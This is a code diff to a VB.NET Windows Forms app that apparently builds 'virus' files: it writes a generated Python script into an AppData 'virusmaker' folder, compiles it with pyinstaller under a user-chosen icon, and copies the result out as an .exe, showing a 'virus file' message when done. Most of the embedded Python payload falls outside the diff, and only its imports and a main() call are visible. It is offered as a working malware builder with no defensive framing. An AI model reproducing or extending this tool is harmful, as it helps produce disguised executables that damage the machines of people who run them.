@@ -1,5 +1,9 @@
-﻿Public Class Form1
+﻿Imports System.Environment
+
+Public Class Form1
     Dim file As System.IO.StreamWriter
+    Dim filee As System.IO.StreamWriter
+
     Dim list As New List(Of String)
     Dim tsil As New List(Of String)
     Dim allcode As New List(Of String)
@@ -40,9 +44,13 @@
             End If
             i += 1
         Next
-        SaveFileDialog1.Filter = "Python files (*.py)|*.py|All files (*.*)|*.*"
+        SaveFileDialog1.Filter = "Executable (*.exe)|*.exe|All files (*.*)|*.*"
         SaveFileDialog1.ShowDialog()
-        file = My.Computer.FileSystem.OpenTextFileWriter(SaveFileDialog1.FileName, True)
+        My.Computer.FileSystem.CreateDirectory(GetFolderPath(SpecialFolder.ApplicationData) + "/virusmaker/")
+        Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData) + "/virusmaker/ch.py"
+        Dim appata As String = GetFolderPath(SpecialFolder.ApplicationData) + "/virusmaker/cmd.bat"
+        Shell("cmd.exe /k" + "pyinstaller -w -F -i " + "'" + TextBox1.Text + "' '" + appData + "'")
+        file = My.Computer.FileSystem.OpenTextFileWriter(appData, True)
         file.WriteLine("import random
 import shutil
 import os 
@@ -82,10 +90,21 @@ import webbrowser as web
 ")
         file.WriteLine("main()")
         file.Close()
+        Dim apph As String = My.Application.Info.DirectoryPath
+        Threading.Thread.Sleep(3000)
+        My.Computer.FileSystem.CopyFile(apph + "\dist\ch.exe", SaveFileDialog1.FileName())
         MessageBox.Show("file done", "virus file - hts ", MessageBoxButtons.OK)
+
     End Sub
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+    End Sub
+
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        OpenFileDialog1.Filter = "icon (*.ICO)|*.ICO|All files (*.*)|*.*"
+        OpenFileDialog1.ShowDialog()
+        TextBox1.Text = OpenFileDialog1.FileName
 
     End Sub
 End Class
